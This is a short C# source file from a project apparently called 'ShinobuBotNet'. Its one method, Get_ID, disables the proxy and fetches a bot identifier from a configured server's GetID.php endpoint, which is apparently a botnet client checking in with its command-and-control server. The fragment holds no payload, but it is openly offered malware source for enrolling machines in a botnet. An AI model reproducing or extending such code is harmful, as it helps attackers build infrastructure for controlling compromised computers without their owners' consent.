using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;

namespace ShinobuBotNet
{
    class GetInfo
    {
        public static string Get_ID()
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            string id = wc.DownloadString(configs.server + "GetID.php");
            return id;
        }
    }
}
